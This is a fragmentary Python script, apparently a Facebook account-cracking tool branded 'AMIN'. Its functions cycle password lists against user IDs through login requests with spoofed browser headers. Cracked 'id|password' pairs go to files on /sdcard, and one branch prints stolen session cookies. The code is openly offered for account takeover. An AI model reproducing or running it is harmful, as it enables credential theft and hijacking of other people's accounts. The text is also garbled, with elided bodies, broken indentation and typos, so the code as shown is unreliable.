...
fbks=('com.facebo.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana')
...
logo=("""\x1b[1;97m
 ...
 ██   ██ ██      ██ ██ ██   ████ FREE PALESTINE 🇵🇸🥷🏻
     ...
     ┌───────────────────────────────────────┐
     │ [💸] CODED BY :FRER PALESTINE           │
     │ [💸] GITHUB   : AMIN                │
     │ [💸] WHATSAPP : NO        │
     │ [💸] VERSION  : A.1                   │
     │ [💸] HACKED   : \033[1;32mMr. AMIN \033[1;37m              │
     └───────────────────────────────────────┘""")
def linex():
	print(50*'_')
def clear():
...
def api1(ids,names,passlist):
		try:
			...
			for pw in passlist:
				...
				q = json.loads(po)
				if 'session_key' in q:
					print('\r\r\033[1;32m [AMIN-OK] '+ids+' | '+pas+'\033[1;37m')
					open('/sdcard/AMIN-OK.txt','a').write(ids+'|'+pas+'\n')
					oks.append(ids)
					break
				elif 'www.facebook.com' in q['error_msg']:
					if 'y' in pcp:
						print('\r\r\x1b[38;5;205m [AMIN-OK] '+ids+' | '+pas+'\033[1;37m')
						open('/sdcard/AMIN-OK.txt','a').write(ids+'|'+pas+'\n')
						cps.append(ids)
						break
					else:
...
def api2(ids,names,passlist):
    ...
    'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_5) AppleWebKit/537.36 (KHTML, like Gecko) Version/10.5 Safari/623.19',
    'viewport-width': '980',
}
                        ...
                        if 'session_key' in po:
                                        print('\r\r\033[1;37m [AMIN-OK] '+ids+' | '+pas+'\033[1;37m')
...
"Content-Length": "329",}
                        ...
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print('\r\r\033[1;3,7m [AMIN-OK] '+ids+' | '+pas+'\033[1;37m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print("Cookie: "+coki)
                                        ...
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[AMIB-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
...
def api4(ids,names,passlist):
    ...
    'viewport-width': '980',
                        ...
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print('\r\r\033[1;37m [AMIN-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/AMIN-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        ...
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;206m [AMIN-OK] '+ids+' | '+pas+'\033[1;37m')
                                                open('/sdcard/AMIN-OK.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in AMIN:
				...
				open('/sdcard/ANIN-OK.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in AMIN:
				...
				if 'y' in pcp:
					print('\r\r\x1b[38;5;205m [ANIN-OK] '+ids+' | '+pas+'\033[1;37m')
					open('/sdcard/AMIN-OK.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
    ...
    'viewport-width': '980',
                        ...
                        if 'session_key' in po:
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[38;5;205m [AMIN-OK] '+str(uid)+' | '+pas+'\033[1;37m')
                                        open('/sdcard/AMIN-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
	...
	try:
		for pas in passlist:
			...
			if 'session_key' in q:
				...
				print('\r\r\x1b[38;5;205m [AMIN-OK] '+ids+' | '+pas+'\033[1;37m')
				open('/sdcard/AMIN-rnd-OK.txt','a').write(ids+'|'+pas+'\n')
				cps.append(ids)
				break
			else:
				continue
    ...
    'viewport-width': '980',
			...
			if 'c_user' in log_cookies:
				...
				if uid in cps:pass
					...
					print('\r\r\x1b[38;5;205m [AMIN-OK] '+uid+' | '+pas+'\033[1;37m')
					open('/sdcard/AMIN-rnd-OK.txt', 'a').write(uid+'|'+pas+'\n')
					cps.append(ids)
					break
			else:
